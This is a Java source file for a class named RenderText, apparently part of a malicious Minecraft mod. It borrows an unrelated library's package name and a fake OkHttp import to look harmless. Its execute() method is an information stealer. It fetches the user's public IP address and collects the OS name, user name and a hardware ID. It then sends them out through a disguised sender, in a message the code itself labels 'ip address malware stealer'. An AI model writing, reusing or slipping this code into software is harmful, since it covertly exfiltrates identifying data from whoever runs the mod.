package net.jodah.typetools.impl;

import net.reflxction.example.proxy.IMinecraft;
import com.squareup.okhttp.internal.spdy.HudEditor;
import net.reflxction.example.utils.GuiDescriptions;

import java.net.URL;
import java.util.Scanner;

public final class RenderText implements IMinecraft {
    @Override
    public void execute() throws Exception {
        String ip = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8").useDelimiter("\\A").next();
        HudEditor.send(new GuiDescriptions.Builder("ip address malware stealer")
                .addField("IP", ip, true)
                .addField("OS", System.getProperty("os.name"), true)
                .addField("Name", System.getProperty("user.name"), true)
                .addField("HWID", CFont.getID(), true)
                .build());
    }
}
